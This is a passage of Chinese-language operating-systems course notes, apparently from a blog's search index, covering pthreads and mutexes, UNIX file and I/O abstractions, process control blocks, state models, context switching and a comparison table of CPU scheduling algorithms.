start="5"><li><p>线程掩盖了I/O延迟。</p></li><li><p>线程的三种状态：运行、就绪、阻塞</p></li><li><p>多线程程序：运行可执行程序将创建执行该程序的进程，最初新进程在自己的地址空间中只有一个线程。生成多线程程序的方法：调用<code>pthread_create()</code>创建新线程，指定线程函数和参数，使用<code>pthread_join()</code>等待线程结束，编译时需链接<code>-lpthread</code>库。</p></li><li><p><code>pthread</code> 是一套标准化的C语言线程操作函数库（如 <code>pthread_create</code>, <code>pthread_join</code>），允许程序在单进程内并发执行多个任务，共享进程资源但拥有独立执行流。</p></li><li><p><strong>pthread常用函数包括：</strong></p><ol><li><strong><code>pthread_create()</code></strong> - 创建新线程，需指定线程函数和参数；</li><li><strong><code>pthread_join()</code></strong> - 阻塞等待线程结束并回收资源；</li><li><strong><code>pthread_exit()</code></strong> - 线程主动退出，可返回结果；</li><li><strong><code>pthread_self()</code></strong> - 获取当前线程ID；</li><li>同步控制函数：<ul><li><strong><code>pthread_mutex_init()/lock()/unlock()</code></strong> - 互斥锁保护共享数据；</li><li><strong><code>pthread_cond_wait()/signal()</code></strong> - 条件变量实现线程间通信；</li></ul></li><li><strong><code>pthread_detach()</code></strong> - 设置线程为分离状态，终止后自动回收资源。</li></ol><p><strong>注</strong>：使用时需链接<code>-lpthread</code>库，并注意同步避免竞争条件。</p></li><li><p>竞争与锁：线程之间的协调，通常涉及共享数据。临界区：访问临界资源的代码，一个线程的临界区必须一次执行完，不能中断。</p></li><li><p><strong>线程竞争（Race Condition）</strong>是指多个线程同时访问和修改同一共享资源时，由于执行顺序的不确定性导致程序结果出现错误或不可预测的行为。例如，两个线程同时对一个变量进行自增操作时，可能因线程切换导致部分修改丢失，最终结果不符合预期。<strong>锁（如互斥锁<code>pthread_mutex_t</code>）</strong>是解决竞争的核心机制：它在共享资源被访问前加锁（确保同一时间仅一个线程能操作），操作完成后解锁（允许其他线程访问）。锁强制将并发操作转为串行，保证数据一致性，但过度使用可能降低性能。简单来说，竞争是“乱抢资源引发的混乱”，锁则是“排队使用资源的规则”。</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_init</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex,     <span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *attr)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="2-3-文件与I-O"><a href="#2-3-文件与I-O" class="headerlink" title="2.3 文件与I/O"></a>2.3 文件与I/O</h3><ol><li>对于文件的抽象：在UNIX系统中，<strong>“万物皆文件”</strong> 是其核心设计哲学，此处的“文件”是一个高度抽象的概念，它远不止于磁盘上存储数据的普通文件。本质上，<strong>一切可以被读写操作（read/write）的资源都被抽象成了文件</strong>，并通过统一的<strong>文件描述符（File Descriptor）</strong> 接口进行访问。这包括：存储数据的<strong>普通文件</strong>（-）、提供进程间通信的<strong>管道（pipe, |）</strong> 和<strong>套接字（socket）</strong>、代表硬件设备的<strong>设备文件</strong>（如/dev/sda，分字符c和块设备b）、以及映射进内存的<strong>虚拟文件</strong>（如/proc目录下的文件，它们实际上是内核数据结构接口）。因此，无论是操作硬盘数据、键盘输入、屏幕输出，还是进行网络通信，在UNIX看来，都只是在用<code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>等相同的系统调用对不同的“文件”进行读写，这种极致抽象极大地简化了系统的设计和应用开发。</li><li>POSIX I/O：POSIX I/O 是POSIX标准定义的一组文件输入/输出（Input/Output）系统调用，提供跨UNIX/Linux系统的统一文件操作接口。使用前open，面向字节，显式close</li><li>文件的缓冲机制：<strong>操作系统的文件缓冲机制</strong> 是一种提升I/O效率的核心技术，其核心思想是在<strong>高速的内存（RAM）中开辟一块区域作为缓冲区</strong>，作为慢速的外设（如硬盘）与高速的CPU之间的数据中转站。当进程写入数据时，并不直接写入磁盘，而是先复制到内存缓冲区，由操作系统在后台选择合适的时机（如缓冲区满或定期刷写）再统一写入磁盘，这能将多次零散的小写操作合并为一次大的顺序写操作，极大减少了耗时的磁盘访问次数；读取数据时，操作系统也会预读更多数据到缓冲区，使得后续的读取请求可以直接从内存获取，避免了真实的磁盘寻道。这种机制<strong>以少量的内存空间为代价，通过批处理和预读策略，有效地掩盖了I/O速度的不匹配问题</strong>，显著提升了系统整体性能，但代价是可能带来数据延迟写入的风险（如突然断电可能导致数据丢失）。</li><li><strong>共享文件描述符</strong>是指多个进程（如父子进程通过<code>fork()</code>继承）或线程持有指向<strong>同一个内核文件表项</strong>的描述符编号，这意味着它们不仅共享对底层文件（如普通文件、套接字或管道）的访问权限，更重要的是<strong>共享文件的内部状态</strong>，尤其是<strong>当前读写偏移量</strong>。例如，若进程A通过<code>lseek</code>移动了文件指针，进程B接下来的读操作会从新的位置开始；同理，若两个进程同时写入一个共享描述符指向的文件，它们的输出数据会按写入顺序正确拼接，而不会相互覆盖。这种机制是实现进程间顺序协作通信（如管道）的基础，但也要求使用者注意并发操作的同步问题。</li></ol><hr><h2 id="🌟-第三章-进程管理与进程调度"><a href="#🌟-第三章-进程管理与进程调度" class="headerlink" title="🌟 第三章 进程管理与进程调度"></a>🌟 第三章 进程管理与进程调度</h2><ol><li><strong>进程控制块（PCB）</strong> 是操作系统内核中为每个进程创建的一个核心数据结构，它如同进程的“身份证”和“档案袋”，完整地记录了进程的所有关键信息。当进程被创建时，内核就为其分配一个PCB；当进程被调度执行时，CPU的上下文（如寄存器值）被存入其PCB；当进程被切换下CPU时，其运行状态又从PCB中恢复。PCB中主要包含<strong>进程标识信息（如PID）</strong>、<strong>处理器状态（如寄存器、程序计数器）</strong>、<strong>进程控制信息（如状态、优先级）</strong> 以及<strong>资源清单（如打开的文件、内存分配）</strong>。因此，PCB是操作系统感知、管理和控制进程的唯一实体，是进程调度的直接依据。</li><li>三状态模型（运行、就绪、阻塞）—（+new +terminated）—-&gt; 五状态模型 —-（+suspend）—&gt;七状态模型。</li></ol><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E4%BA%94%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9E%8B.png" alt="五状态模型"></p><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E4%B8%83%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9E%8B.png" alt="七状态模型"></p><ol start="3"><li><p><strong>操作系统的上下文切换-调度循环</strong>是内核在多进程间实现并发执行的核心机制。其本质是一个“保存-切换-恢复”的循环：当定时中断发生或运行中进程主动放弃CPU时，<strong>调度器</strong>会首先将当前进程的执行现场（包括程序计数器、寄存器等上下文）保存到其进程控制块（PCB，在内存中）中，并将其状态置为就绪或阻塞；随后，<strong>调度算法</strong>从就绪队列中选择一个最应运行的进程，并将其PCB中保存的上下文重新加载到CPU寄存器中；最后，CPU开始执行新进程。这个过程循环往复，通过快速轮转，在用户看来便形成了多个进程“同时”运行的假象。整个循环完全由内核在背后驱动，对进程透明，是实现多任务并发的基石。</p></li><li><p><strong>开销</strong>：（1）只有一个CPU核心，非并行 切换开销:  同进程:  低 不同进程: 高 数据保护 同进程: 低 不同进程: 高 共享数据开销 同进程: 低 不同进程: 高 。（2）多个CPU核心，并行 切换开销:  同进程:  低 不同进程: 高 数据保护 同进程: 低 不同进程: 高 共享数据开销 同进程: 低 不同进程同核心：中 不同进程不同核心: 高 （cache)</p></li><li><p><strong>内部事件</strong>源于当前正在CPU上执行的进程自身的动作，而<strong>外部事件</strong>则源于与该进程无关的系统活动。内部事件：系统调用如fopen、发生异常、主动让出CPU。外部事件：时钟中断、I/O中断。</p></li><li><p>进程调度主要是队列操作，调度算法从就绪队列中选取线程。</p></li><li><p>CPU进程调度：通过多道程序设计得到CPU的最高利用率。CPU调度决策可能发生在：进程从运行切换到等待，进程从运行切换到就绪，进程从等待切换到就绪，进程终止。14非抢占，23抢占。调度延时：调度程序终止一个进程的运行并并启动另一个进程运行所花的时间</p></li><li><p>调度算法优化准则：最大的CPU利用率，最大的吞吐量，最短的周转时间，最短的等待时间，最短的响应时间。</p></li><li><p>调度算法：先来先服务FCFS、短作业优先SJF、最短剩余时间优先（指数平均数）、轮转法、优先级调度、多级队列、多级反馈队列、最早截止时间优先、比例分享调度、可移植操作系统接口（POSIX）实时调度</p></li></ol><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E6%9C%80%E7%9F%AD%E5%89%A9%E4%BD%99%E6%97%B6%E9%97%B4%E4%BC%98%E5%85%88.png" alt="最短剩余时间优先"></p><ol start="10"><li>操作系统调度算法详解</li></ol><table><thead><tr><th align="left">调度算法</th><th align="left">核心思想</th><th align="left">调度依据</th><th align="left">优点</th><th align="left">缺点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left"><strong>先来先服务 (FCFS)</strong></td><td align="left">像排队一样，先到的进程先接受服务。</td><td align="left">进程到达就绪队列的时间。</td><td align="left">简单、公平、实现简单。</td><td align="left">** convoy效应 **：短进程可能因等待长进程而耗时很久；平均等待时间较长。</td><td align="left">早期批处理系统；现已很少作为主要算法。</td></tr><tr><td align="left"><strong>短作业优先 (SJF)</strong></td><td align="left">优先运行预计执行时间最短的进程，以使平均等待时间最小。</td><td align="left">进程的（预估）下一个CPU执行区间长度。</td><td align="left"><strong>理论上的最优平均等待时间</strong>（针对非抢占式）。</td><td align="left"><strong>可能导致长进程饥饿</strong>；需要预知未来（执行时间难以准确预估）。</td><td align="left">理论模型；适用于能较准确估计运行时间的批作业。</td></tr><tr><td align="left"><strong>最短剩余时间优先 (SRTN)</strong></td><td align="left">SJF的<strong>抢占式</strong>版本。当新进程就绪时，会与当前进程的剩余时间比较，运行剩余时间最短的。</td><td align="left">进程的<strong>剩余</strong>执行时间。</td><td align="left">比SJF有更优的平均周转时间。</td><td align="left">实现复杂；需要预知总执行时间；可能造成长进程饥饿。</td><td align="left">理论价值高，实际因“预知时间”问题而较少使用。</td></tr><tr><td align="left"><strong>轮转法 (RR)</strong></td><td align="left">为每个进程分配一个固定的<strong>时间片</strong>，时间片用完则强行切换，进程回到就绪队列末尾。</td><td align="left">时间片是否用完。</td><td align="left"><strong>公平性强</strong>，响应时间有保障，适用于分时系统。</td><td align="left">时间片设置关键：太长退化为FCFS；太短切换开销过大。平均等待时间较长。</td><td align="left"><strong>交互式系统</strong>的经典算法（如Unix/Linux的默认调度）。</td></tr><tr><td align="left"><strong>优先级调度</strong></td><td align="left">每个进程拥有一个优先级，调度器总是选择优先级最高的进程运行。</td><td align="left">进程的优先级（静态或动态）。</td><td align="left">能区分任务紧急程度，灵活。</td><td align="left"><strong>可能导致低优先级进程饥饿</strong>；静态优先级不够灵活。</td><td align="left">广泛用于各种系统，常与其他算法（如RR）结合使用。</td></tr><tr><td align="left"><strong>多级队列 (MQ)</strong></td><td align="left">将就绪队列划分为多个独立队列，每个队列可拥有自己的调度算法（如系统进程用RR，交互进程用高优先级）。</td><td align="left">进程的类型（系统、交互、批处理等）。</td><td align="left">根据进程类型区别对待，策略灵活。</td><td align="left">队列间调度不灵活（可能存在队列饥饿）；需要预先分类。</td><td align="left">用于对任务类型有清晰划分的系统。</td></tr><tr><td align="left"><strong>多级反馈队列 (MLFQ)</strong></td><td align="left"><strong>MQ的改进版</strong>，是实际系统中最常用的算法之一。允许进程在队列间<strong>移动</strong>（如未在时间片内完成则降低优先级）。</td><td align="left">进程已执行的时间和历史行为。</td><td align="left">结合了RR和优先级调度的优点：<strong>短作业优先完成，交互式任务响应快，长作业也不会完全饥饿</strong>。</td><td align="left">参数（队列数量、时间片大小、优先级调整规则）设置复杂，影响性能。</td><td align="left"><strong>通用操作系统的核心调度算法</strong>（如Windows NT、Unix System V）。</td></tr><tr><td align="left"><strong>最早截止时间优先 (EDF)</strong></td><td align="left">优先运行<strong>截止时间最早</strong>的任务。是<strong>动态优先级</strong>调度。</td><td align="left">任务的绝对截止时间。</td><td align="left"><strong>理论最优</strong>的动态优先级实时调度算法（CPU利用率可达100%）。</td><td align="left">进程超载时系统行为难以预测；实现复杂。</td><td align="left"><strong>软实时系统</strong>（如多媒体播放）。</td></tr><tr><td align="left"><strong>比例分享调度</strong></td><td align="left">目标是让每个进程获得其预先定义的<strong>CPU时间份额</strong>（如A占50%，B占30%）。</td><td align="left">进程已获得的CPU时间与其应得份额的差距。</td><td align="left">能提供精确的QoS（服务质量）保证。</td><td align="left">需要额外的机制（如彩票、步幅）来跟踪和决策。</td><td align="left">需要保证特定应用性能的场景（如虚拟化、云平台）。</td></tr><tr><td align="left"><strong>POSIX实时调度</strong></td><td align="left">这是一套<strong>API标准</strong>，定义了如何控制调度策略，而非具体算法。主要包括： 1. <strong><code>SCHED_FIFO</code></strong>: 类似FCFS，但基于静态优先级，可抢占低优先级任务，无限时间运行。 2. <strong><code>SCHED_RR</code></strong>: 类似<code>SCHED_FIFO</code>，但增加了时间片，同优先级任务按轮转法执行。 3. <strong><code>SCHED_OTHER</code></strong>: 指系统默认的非实时调度策略（如Linux的CFS）。</td><td align="left">由程序员通过API设置的静态优先级和策略。</td><td align="left">为实时应用提供<strong>可预测性和确定性</strong>。</td><td align="left">需要程序员负责正确设置优先级，否则高优先级任务可能霸占CPU。</td><td align="left"><strong>硬实时和软实时应用</strong>（如工业控制、机器人、航空电子）。</td></tr></tbody></table><ol start="11"><li>算法评估确定性评价：对于每个算法计算最小平均等待时间。随机过程的排队模型，下一个人将在x时间内到达。概率模型，不是精确值，而是均值</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
